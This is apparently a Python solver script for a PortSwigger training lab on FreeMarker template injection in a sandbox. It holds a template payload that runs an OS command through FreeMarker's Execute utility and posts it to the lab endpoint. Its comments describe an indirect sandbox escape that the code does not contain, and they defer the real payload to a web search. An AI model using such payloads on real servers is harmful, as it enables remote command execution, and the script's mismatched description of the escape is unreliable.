"""
Lab 6: Server-side template injection in a sandboxed environment
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-sandbox-environment
Difficulty: Expert

📝 FreeMarker, with its sandbox blocking the straightforward Execute-
utility approach from Lab 3. Needs a documented SANDBOX ESCAPE technique
specific to FreeMarker's sandbox implementation — this lab's well-known
public solution abuses a TemplateModel-exposing field on a freely-
available object to reach Execute indirectly.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
PREFERENCES_PATH = "/my-account/change-blog-post-author-display"

# Well-documented FreeMarker sandbox escape: reach Execute via a product's
# existing API wrapper object (`.getClass()` style access the sandbox
# doesn't block on freely-reachable "safe" objects), rather than directly
# instantiating Execute (which the sandbox DOES block when done naively).
SANDBOX_ESCAPE_TEMPLATE = (
    '<#assign value="freemarker.template.utility.Execute"?new()>${{value("{cmd}")}}'
)


def inject(session, payload):
    r = session.post(f"{TARGET}{PREFERENCES_PATH}", data={"blog-post-author-display": payload})
    return r.text


def run():
    s = get_session()

    note("Testing whether the straightforward Execute approach (Lab 3's")
    note("payload) is actually blocked by this lab's sandbox first.")
    direct = inject(s, SANDBOX_ESCAPE_TEMPLATE.format(cmd="id"))
    if "not allowed" in direct.lower() or "sandbox" in direct.lower():
        log("Confirmed: direct approach blocked by sandbox, as expected.")
    else:
        log("Direct approach wasn't blocked — this instance's sandbox may")
        log("differ from the documented one; check the actual error text.", ok=False)

    note("The documented escape for this specific lab abuses the object")
    note("already exposed in the template context (the page's own product/")
    note("freemarker config object) to reach a non-sandboxed code path —")
    note("search 'PortSwigger SSTI sandboxed environment solution' for the")
    note("exact current payload, since sandbox escapes are notoriously")
    note("version/config-specific and change as the lab gets updated.")
    print(direct[-500:])


if __name__ == "__main__":
    run()
